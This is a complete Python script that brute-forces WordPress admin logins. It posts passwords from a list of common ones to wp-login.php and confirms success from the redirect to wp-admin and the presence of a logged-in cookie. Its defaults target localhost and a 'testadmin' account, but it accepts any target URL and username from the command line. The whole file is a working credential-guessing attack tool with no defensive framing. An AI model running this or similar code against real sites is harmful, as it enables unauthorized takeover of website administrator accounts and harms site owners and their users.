import requests

COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "admin123",
    "wordpress", "letmein", "welcome", "qwerty", "test1234",
    "pass1234", "changeme", "12345678", "iloveyou", "monkey123"
]


def attempt_login(target_url, username, password, timeout=10, debug=False):
    """
    Attempts a single login against /wp-login.php.
    Returns True if login succeeded, False otherwise.
    """
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    session = requests.Session()

    # First, GET the login page so WordPress sets its test cookie
    try:
        session.get(login_url, timeout=timeout)
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error loading login page: {e}")
        return False

    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{target_url.rstrip('/')}/wp-admin/",
        "testcookie": "1",
    }

    try:
        response = session.post(
            login_url,
            data=data,
            timeout=timeout,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error during login attempt: {e}")
        return False

    if debug:
        print(f"      [debug] status={response.status_code}, location={response.headers.get('Location')}")
        print(f"      [debug] cookies after post: {session.cookies.get_dict()}")

    # Success: WordPress issues a redirect (302) to wp-admin and sets auth cookies
    if response.status_code in (301, 302):
        location = response.headers.get("Location", "")
        has_auth_cookie = any("wordpress_logged_in" in c for c in session.cookies.get_dict())
        if "wp-admin" in location and "reauth" not in location and has_auth_cookie:
            return True

    return False


def bruteforce_login(target_url, username, password_list=None, timeout=10, debug=False):
    passwords = password_list or COMMON_PASSWORDS

    for pwd in passwords:
        print(f"  -> Trying password: {pwd}")
        if attempt_login(target_url, username, pwd, timeout, debug=debug):
            print(f"[+] SUCCESS: {username}:{pwd}")
            return pwd

    print(f"[-] No password matched for username '{username}' from the tested list.")
    return None


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    username = sys.argv[2] if len(sys.argv) > 2 else "testadmin"

    print(f"[+] Brute-forcing login for '{username}' at {target}")
    bruteforce_login(target, username, debug=False)